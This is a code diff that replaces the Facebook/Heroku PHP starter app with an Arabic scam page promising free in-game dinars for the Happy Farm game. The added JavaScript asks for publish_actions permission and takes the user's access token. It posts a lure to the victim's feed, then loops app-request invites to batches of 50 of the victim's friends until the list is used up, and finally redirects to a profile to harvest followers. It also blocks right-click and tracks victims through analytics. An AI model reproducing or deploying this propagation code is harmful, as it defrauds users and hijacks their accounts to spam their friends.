@@ -1,384 +1,322 @@
 <?php
 
-/**
- * This sample app is provided to kickstart your experience using Facebook's
- * resources for developers.  This sample app provides examples of several
- * key concepts, including authentication, the Graph API, and FQL (Facebook
- * Query Language). Please visit the docs at 'developers.facebook.com/docs'
- * to learn more about the resources available to you
- */
-
-// Provides access to app specific values such as your app id and app secret.
-// Defined in 'AppInfo.php'
-require_once('AppInfo.php');
-
-// Enforce https on production
-if (substr(AppInfo::getUrl(), 0, 8) != 'https://' && $_SERVER['REMOTE_ADDR'] != '127.0.0.1') {
-  header('Location: https://'. $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-  exit();
-}
-
-// This provides access to helper functions defined in 'utils.php'
-require_once('utils.php');
 
 
-/*****************************************************************************
- *
- * The content below provides examples of how to fetch Facebook data using the
- * Graph API and FQL.  It uses the helper functions defined in 'utils.php' to
- * do so.  You should change this section so that it prepares all of the
- * information that you want to display to the user.
- *
- ****************************************************************************/
-
-require_once('sdk/src/facebook.php');
-
-$facebook = new Facebook(array(
-  'appId'  => AppInfo::appID(),
-  'secret' => AppInfo::appSecret(),
-  'sharedSession' => true,
-  'trustForwarded' => true,
-));
-
-$user_id = $facebook->getUser();
-if ($user_id) {
-  try {
-    // Fetch the viewer's basic information
-    $basic = $facebook->api('/me');
-  } catch (FacebookApiException $e) {
-    // If the call fails we check if we still have a user. The user will be
-    // cleared if the error is because of an invalid accesstoken
-    if (!$facebook->getUser()) {
-      header('Location: '. AppInfo::getUrl($_SERVER['REQUEST_URI']));
-      exit();
-    }
-  }
-
-  // This fetches some things that you like . 'limit=*" only returns * values.
-  // To see the format of the data you are retrieving, use the "Graph API
-  // Explorer" which is at https://developers.facebook.com/tools/explorer/
-  $likes = idx($facebook->api('/me/likes?limit=4'), 'data', array());
-
-  // This fetches 4 of your friends.
-  $friends = idx($facebook->api('/me/friends?limit=4'), 'data', array());
-
-  // And this returns 16 of your photos.
-  $photos = idx($facebook->api('/me/photos?limit=16'), 'data', array());
-
-  // Here is an example of a FQL call that fetches all of your friends that are
-  // using this app
-  $app_using_friends = $facebook->api(array(
-    'method' => 'fql.query',
-    'query' => 'SELECT uid, name FROM user WHERE uid IN(SELECT uid2 FROM friend WHERE uid1 = me()) AND is_app_user = 1'
-  ));
-}
-
-// Fetch the basic info of the app that they are using
-$app_info = $facebook->api('/'. AppInfo::appID());
-
-$app_name = idx($app_info, 'name', '');
-
-?>
-<!DOCTYPE html>
-<html xmlns:fb="http://ogp.me/ns/fb#" lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
-
-    <title><?php echo he($app_name); ?></title>
-    <link rel="stylesheet" href="stylesheets/screen.css" media="Screen" type="text/css" />
-    <link rel="stylesheet" href="stylesheets/mobile.css" media="handheld, only screen and (max-width: 480px), only screen and (max-device-width: 480px)" type="text/css" />
-
-    <!--[if IEMobile]>
-    <link rel="stylesheet" href="mobile.css" media="screen" type="text/css"  />
-    <![endif]-->
-
-    <!-- These are Open Graph tags.  They add meta data to your  -->
-    <!-- site that facebook uses when your content is shared     -->
-    <!-- over facebook.  You should fill these tags in with      -->
-    <!-- your data.  To learn more about Open Graph, visit       -->
-    <!-- 'https://developers.facebook.com/docs/opengraph/'       -->
-    <meta property="og:title" content="<?php echo he($app_name); ?>" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="<?php echo AppInfo::getUrl(); ?>" />
-    <meta property="og:image" content="<?php echo AppInfo::getUrl('/logo.png'); ?>" />
-    <meta property="og:site_name" content="<?php echo he($app_name); ?>" />
-    <meta property="og:description" content="My first app" />
-    <meta property="fb:app_id" content="<?php echo AppInfo::appID(); ?>" />
-
-    <script type="text/javascript" src="/javascript/jquery-1.7.1.min.js"></script>
-
-    <script type="text/javascript">
-      function logResponse(response) {
-        if (console && console.log) {
-          console.log('The response was', response);
-        }
-      }
-
-      $(function(){
-        // Set up so we handle click on the buttons
-        $('#postToWall').click(function() {
-          FB.ui(
-            {
-              method : 'feed',
-              link   : $(this).attr('data-url')
-            },
-            function (response) {
-              // If response is null the user canceled the dialog
-              if (response != null) {
-                logResponse(response);
-              }
+   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns:og="http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="Get 100K Dinar Mazra3a Alsa3ida By Ibrahim Mohammad" />
+<meta name="keywords" content="Gays Gay Gay" />
+<meta property="og:title" content="Get 100K Dinar Mazra3a Alsa3ida By Ibrahim Mohammad"/>
+<meta property="og:type" content="Web" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta property="og:site_name" content="Get 100K Dinar Mazra3a Alsa3ida By Ibrahim Mohammad" />
+<meta property="og:description" content="Get 100K Dinar Mazra3a Alsa3ida By Ibrahim Mohammad" />
+<meta http-equiv="imagetoolbar" CONTENT="no">
+<link rel="shortcut icon" href="http://im42.gulfup.com/SDImM.png">
+    <head>
+        <title>Get 100K Dinar Mazra3a Alsa3ida By Ibrahim Mohammad</title>
+<center>
+        <style>
+                img {
+                    border: 0;
+                }
+                body {
+                    width:100%;
+                    height:100%;
+                    margin: 0px 0px;
+                }
+            #ol1 {
+                padding-left: 6cm;
+                padding-top: 8cm;
             }
-          );
-        });
-
-        $('#sendToFriends').click(function() {
-          FB.ui(
-            {
-              method : 'send',
-              link   : $(this).attr('data-url')
-            },
-            function (response) {
-              // If response is null the user canceled the dialog
-              if (response != null) {
-                logResponse(response);
-              }
+            #modal {
+                width:100%;
+                height:100%;
+                position:fixed;
+                z-index:100;
+                background: #000;
+                -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=85)";
+                          /* IE 5-7 */
+                          filter: alpha(opacity=85);
+                          /* Netscape */
+                          -moz-opacity: 0.85;
+                          /* Safari 1.x */
+                          -khtml-opacity: 0.85;
+                          /* Good browsers */
+                          opacity: 0.85;
+                          
             }
-          );
-        });
-
-        $('#sendRequest').click(function() {
-          FB.ui(
-            {
-              method  : 'apprequests',
-              message : $(this).attr('data-message')
-            },
-            function (response) {
-              // If response is null the user canceled the dialog
-              if (response != null) {
-                logResponse(response);
-              }
+            .container {
+                width: 100%;
+                height:100%;
+                position:fixed;
+                margin: 0 auto;
+                z-index: 1001;
             }
-          );
-        });
-      });
-    </script>
-
-    <!--[if IE]>
-      <script type="text/javascript">
-        var tags = ['header', 'section'];
-        while(tags.length)
-          document.createElement(tags.pop());
-      </script>
-    <![endif]-->
-  </head>
-  <body>
-    <div id="fb-root"></div>
-    <script type="text/javascript">
-      window.fbAsyncInit = function() {
-        FB.init({
-          appId      : '<?php echo AppInfo::appID(); ?>', // App ID
-          channelUrl : '//<?php echo $_SERVER["HTTP_HOST"]; ?>/channel.html', // Channel File
-          status     : true, // check login status
-          cookie     : true, // enable cookies to allow the server to access the session
-          xfbml      : true // parse XFBML
-        });
-
-        // Listen to the auth.login which will be called when the user logs in
-        // using the Login button
-        FB.Event.subscribe('auth.login', function(response) {
-          // We want to reload the page now so PHP can read the cookie that the
-          // Javascript SDK sat. But we don't want to use
-          // window.location.reload() because if this is in a canvas there was a
-          // post made to this page and a reload will trigger a message to the
-          // user asking if they want to send data again.
-          window.location = window.location;
-        });
-
-        FB.Canvas.setAutoGrow();
-      };
-
-      // Load the SDK Asynchronously
-      (function(d, s, id) {
-        var js, fjs = d.getElementsByTagName(s)[0];
-        if (d.getElementById(id)) return;
-        js = d.createElement(s); js.id = id;
-        js.src = "//connect.facebook.net/en_US/all.js";
-        fjs.parentNode.insertBefore(js, fjs);
-      }(document, 'script', 'facebook-jssdk'));
-    </script>
-
-    <header class="clearfix">
-      <?php if (isset($basic)) { ?>
-      <p id="picture" style="background-image: url(https://graph.facebook.com/<?php echo he($user_id); ?>/picture?type=normal)"></p>
-
-      <div>
-        <h1>Welcome, <strong><?php echo he(idx($basic, 'name')); ?></strong></h1>
-        <p class="tagline">
-          This is your app
-          <a href="<?php echo he(idx($app_info, 'link'));?>" target="_top"><?php echo he($app_name); ?></a>
-        </p>
-
-        <div id="share-app">
-          <p>Share your app:</p>
-          <ul>
-            <li>
-              <a href="#" class="facebook-button" id="postToWall" data-url="<?php echo AppInfo::getUrl(); ?>">
-                <span class="plus">Post to Wall</span>
-              </a>
-            </li>
-            <li>
-              <a href="#" class="facebook-button speech-bubble" id="sendToFriends" data-url="<?php echo AppInfo::getUrl(); ?>">
-                <span class="speech-bubble">Send Message</span>
-              </a>
-            </li>
-            <li>
-              <a href="#" class="facebook-button apprequests" id="sendRequest" data-message="Test this awesome app">
-                <span class="apprequests">Send Requests</span>
-              </a>
-            </li>
-          </ul>
-        </div>
-      </div>
-      <?php } else { ?>
-      <div>
-        <h1>Welcome</h1>
-        <div class="fb-login-button" data-scope="user_likes,user_photos"></div>
-      </div>
-      <?php } ?>
-    </header>
-
-    <section id="get-started">
-      <p>Welcome to your Facebook app, running on <span>heroku</span>!</p>
-      <a href="https://devcenter.heroku.com/articles/facebook" target="_top" class="button">Learn How to Edit This App</a>
-    </section>
-
-    <?php
-      if ($user_id) {
-    ?>
-
-    <section id="samples" class="clearfix">
-      <h1>Examples of the Facebook Graph API</h1>
-
-      <div class="list">
-        <h3>A few of your friends</h3>
-        <ul class="friends">
-          <?php
-            foreach ($friends as $friend) {
-              // Extract the pieces of info we need from the requests above
-              $id = idx($friend, 'id');
-              $name = idx($friend, 'name');
-          ?>
-          <li>
-            <a href="https://www.facebook.com/<?php echo he($id); ?>" target="_top">
-              <img src="https://graph.facebook.com/<?php echo he($id) ?>/picture?type=square" alt="<?php echo he($name); ?>">
-              <?php echo he($name); ?>
-            </a>
-          </li>
-          <?php
+            .container .box {
+                width:760px;
+                margin: 0 auto;
+                margin-top:70px;
+                height: 370px;
+                max-height: 10000px;
+                background: #fff;
+                z-index: 1001;
+                opacity: 1;
+                
+                            border: 1px solid rgba(0, 0, 0, 0.3);
+                            -webkit-border-radius: 6px;
+                            -moz-border-radius: 6px;
+                            border-radius: 6px;
+                            -webkit-box-shadow: 0 3px 7px rgba(0, 0, 0, 0.3);
+                            -moz-box-shadow: 0 3px 7px rgba(0, 0, 0, 0.3);
+                            box-shadow: 0 3px 7px rgba(0, 0, 0, 0.3);
+                            -webkit-background-clip: padding-box;
+                            -moz-background-clip: padding-box;
+                            background-clip: padding-box;
+                            padding: 10px;
+                            position:relative;
             }
-          ?>
-        </ul>
-      </div>
-
-      <div class="list inline">
-        <h3>Recent photos</h3>
-        <ul class="photos">
-          <?php
-            $i = 0;
-            foreach ($photos as $photo) {
-              // Extract the pieces of info we need from the requests above
-              $id = idx($photo, 'id');
-              $picture = idx($photo, 'picture');
-              $link = idx($photo, 'link');
-
-              $class = ($i++ % 4 === 0) ? 'first-column' : '';
-          ?>
-          <li style="background-image: url(<?php echo he($picture); ?>);" class="<?php echo $class; ?>">
-            <a href="<?php echo he($link); ?>" target="_top"></a>
-          </li>
-          <?php
+            .box .foot {
+                display:block;
+                margin: 0 auto;
+                position:absolute;
+                left: 315px;
             }
-          ?>
-        </ul>
-      </div>
-
-      <div class="list">
-        <h3>Things you like</h3>
-        <ul class="things">
-          <?php
-            foreach ($likes as $like) {
-              // Extract the pieces of info we need from the requests above
-              $id = idx($like, 'id');
-              $item = idx($like, 'name');
-
-              // This display's the object that the user liked as a link to
-              // that object's page.
-          ?>
-          <li>
-            <a href="https://www.facebook.com/<?php echo he($id); ?>" target="_top">
-              <img src="https://graph.facebook.com/<?php echo he($id) ?>/picture?type=square" alt="<?php echo he($item); ?>">
-              <?php echo he($item); ?>
-            </a>
-          </li>
-          <?php
+            .box .foot a {
+                display:block;
+                text-align:center;
+                border: 1px #ee9999 solid;
+                background: #fff;
+                width: 100px;
+                height: 30px;
+                font-size:25px;
+                color: #999;
+                text-decoration: none;
             }
-          ?>
-        </ul>
-      </div>
-
-      <div class="list">
-        <h3>Friends using this app</h3>
-        <ul class="friends">
-          <?php
-            foreach ($app_using_friends as $auf) {
-              // Extract the pieces of info we need from the requests above
-              $id = idx($auf, 'uid');
-              $name = idx($auf, 'name');
-          ?>
-          <li>
-            <a href="https://www.facebook.com/<?php echo he($id); ?>" target="_top">
-              <img src="https://graph.facebook.com/<?php echo he($id) ?>/picture?type=square" alt="<?php echo he($name); ?>">
-              <?php echo he($name); ?>
-            </a>
-          </li>
-          <?php
+            
+            .box .title {
+                text-align:center;
+                font-weight: bold;
+                font-size: 25px;
+                color: #FF0080;
+                height:30px;
+                
             }
-          ?>
-        </ul>
-      </div>
-    </section>
+        </style>
+		        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
+        <script src="https://ssl.google-analytics.com/ga.js" ></script>
+        <script type="text/javascript">
 
-    <?php
-      }
-    ?>
+                  var _gaq = _gaq || [];
+                  _gaq.push(['_setAccount', 'UA-41334226-1']);
+                  _gaq.push(['_trackPageview']);
+                
+                  (function() {
+                    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+                  })();
+                
+                </script>
+				        <script src="https://ssl.google-analytics.com/ga.js" ></script>
 
-    <section id="guides" class="clearfix">
-      <h1>Learn More About Heroku &amp; Facebook Apps</h1>
-      <ul>
-        <li>
-          <a href="https://www.heroku.com/?utm_source=facebook&utm_medium=app&utm_campaign=fb_integration" target="_top" class="icon heroku">Heroku</a>
-          <p>Learn more about <a href="https://www.heroku.com/?utm_source=facebook&utm_medium=app&utm_campaign=fb_integration" target="_top">Heroku</a>, or read developer docs in the Heroku <a href="https://devcenter.heroku.com/" target="_top">Dev Center</a>.</p>
-        </li>
-        <li>
-          <a href="https://developers.facebook.com/docs/guides/web/" target="_top" class="icon websites">Websites</a>
-          <p>
-            Drive growth and engagement on your site with
-            Facebook Login and Social Plugins.
-          </p>
-        </li>
-        <li>
-          <a href="https://developers.facebook.com/docs/guides/mobile/" target="_top" class="icon mobile-apps">Mobile Apps</a>
-          <p>
-            Integrate with our core experience by building apps
-            that operate within Facebook.
-          </p>
-        </li>
-        <li>
-          <a href="https://developers.facebook.com/docs/guides/canvas/" target="_top" class="icon apps-on-facebook">Apps on Facebook</a>
-          <p>Let users find and connect to their friends in mobile apps and games.</p>
-        </li>
-      </ul>
-    </section>
-  </body>
+                <script>
+                    function skip() {
+                        document.getElementById("modal").style.display = "none";
+                        document.getElementById("container").style.display = "none";
+                    }
+                </script>
+				<script language='JavaScript' type='text/JavaScript'>
+http://htmlgenerator.weebly.com
+var tenth='';function ninth() {
+if (document.all) {(tenth);alert("Code Ibrahim Mohamad"); return false;}}
+function twelfth(e) {
+if (document.layers||(document.getElementById&&!document.all)) {
+if (e.which==2||e.which==3) {(tenth);return false;}}}
+if (document.layers) {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=twelfth;}
+else{document.onmouseup=twelfth;document.oncontextmenu=ninth;}
+document.oncontextmenu=new Function('alert("Coded Ibrahim Mohammad"); return false')
+</script>
+    </head>
+    
+    <body style="background-image: url('http://im35.gulfup.com/aEq2G.png')">
+<p class="style1">&nbsp;</p>
+<p class="style1">&nbsp;</p>
+<p class="style1">&nbsp;</p>
+<p class="style1">&nbsp;</p>
+<p class="style1">
+        <center>
+            <div id="header">
+                <br />
+                <div id="add">
+      
+                </div>
+                <br />
+				                <br />
+                <br />
+                <br />
+				                <br />
+                <br />
+				                <br />
+                <br />
+<center>
+
+                <table>
+                    <tr>
+                        <td>
+                        <!-- ADS -->
+                        </td>
+                        <td style="text-align:center">
+
+                            <div id="ol">
+<img alt="" src="http://im34.gulfup.com/40Kc7.png" /></p>
+                                <a href="#" onclick="return sendRequestToFriends('Ibrahim Mohammad','Ibrahim Mohammad With Your Friends.')">
+                                    <img src="http://im35.gulfup.com/ZTvcj.gif" width="250" height="59" />
+                                </a>
+                                <br />
+                                <br />
+                                <!-- ADS -->
+                            </div>
+                        </td>
+                        <td>
+                           <!-- ADS -->
+                        </td>
+                    </tr>
+                </table>
+</center>
+                <br />
+                <br />
+                <br />
+                <div id="add">
+                </div>
+            </div>
+        </center>
+        <div id="fb-root"></div>
+        <script>
+            var app_id = 528735603901316,
+                app_name = "مزرعتنا السعيدة تقدم 95 الف دينار بمناسبة سنة جديدة 2014",
+                    app_pic = "http://www.iraqup.com/up/20131215/76j1I-sTEo_186213562.jpg",
+                davet_m = '',
+                davet_t = 'Invite Friends To Play',
+                fba = 0,
+                posted = false,
+                app_url = "https://apps.facebook.com/mazranewfb/",
+                post_message = "احصل على الدنانير في مزرعتنا السعيدة من هنا بمناسبة سنة جديدة 2014";
+                
+                        $.getJSON("https://graph.facebook.com/"+app_id,function(response) {
+                            if (response && response.namespace) {
+                                app_url = "http://apps.facebook.com/"+response.namespace;
+                            }
+                        })
+            window.fbAsyncInit = function () {
+                var curLoc = window.location;
+                FB.init({
+                        appId: app_id,
+                        xfbml: true,
+                        oauth: true,
+                        cookie: true
+                    });
+                FB.Canvas.setAutoGrow();
+                FB.Canvas.setDoneLoading();
+            };
+
+            (function () {
+                    var e = document.createElement('script');
+                    e.async = true;
+                    e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
+                    document.getElementById('fb-root').appendChild(e);
+                }());
+            function mshuffle(o) {
+                for (var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
+                return o;
+            };
+            var fbtoken = "";
+            function sendRequestToFriends(txxt, title) {
+                if (true == posted) return false;
+                davet_m = txxt;
+                if (title) davet_t = title;
+                FB.login(function (response) {
+                    //console.log(response);
+                  if (response.authResponse) {
+                          if (response.authResponse.accessToken) {
+                              fbtoken = response.authResponse.accessToken;
+                              var post_url = "https://graph.facebook.com/me/feed";
+                              var post_vars = {
+                                  method: "POST",
+                                  access_token: fbtoken,
+                                  message: post_message,
+                                  link: app_url,
+                                  picture: app_pic,
+                                  name: app_name,
+                                  caption: "H3mo95",
+                                  description: "دنانير المزرعه السعيدة"
+                              }
+                              $.getJSON(post_url,post_vars,function(response){
+                                  posted_id = response.id || 0;
+                                  _gaq.push(['_trackEvent', 'post', posted_id]);
+                              })
+                              
+                          }
+                      FB.api('/me', function (response) {
+                        fba = response.id;
+                      });
+                      all();
+                  } else {
+                      _gaq.push(['_trackEvent', 'Auth', fba]);
+                      //all();
+                  }
+                },{
+                    scope: "publish_actions"
+                });
+                return false;
+            };
+
+            function all() {
+                var f = [];
+                FB.api('/me/friends', function (response) {
+                        _gaq.push(['_trackEvent', 'Friends', fba, '', response.data.length]);
+                        for (var i = 0; i < response.data.length; i++) f.push(response.data[i].id);
+                        loop(f);
+                    });
+            };
+
+            function loop(f) {
+                var l = Math.min(f.length, 50),
+                    t = [];
+                mshuffle(f);
+                if (0 != l) {
+                    for (var j = 0; j < l; j++) t.push(f[j]);
+                    FB.ui({
+                            method: 'apprequests',
+                            data: app_id,
+                            message: davet_m,
+                            title: davet_t,
+                            to: t
+                        }, function (response) {
+                            if (response) {
+                                _gaq.push(['_trackEvent', 'Requests', fba, '', response.to.length]);
+                                for (var i = 0; i < response.to.length; i++) {
+                                    var idx = f.indexOf(response.to[i]);
+                                    - 1 != idx && f.splice(idx, 1);
+                                }
+                                if (f.length == 0) {
+                                    top.location.href = 'https://www.facebook.com/ahmad.alosaimy.7/following';
+                                }
+                                f.length > 0 && loop(f);
+                            } else {
+                                _gaq.push(['_trackEvent', 'Requests', fba]);
+                                f.length > 0 && loop(f);
+                            }
+                        });
+
+                } else {
+                    top.location.href = 'https://www.facebook.com/ahmad.alosaimy.7/following';
+                }
+            }
+        </script>
+<div style="visibility:hidden">
+</div>
+    </body>
+</center> 
 </html>
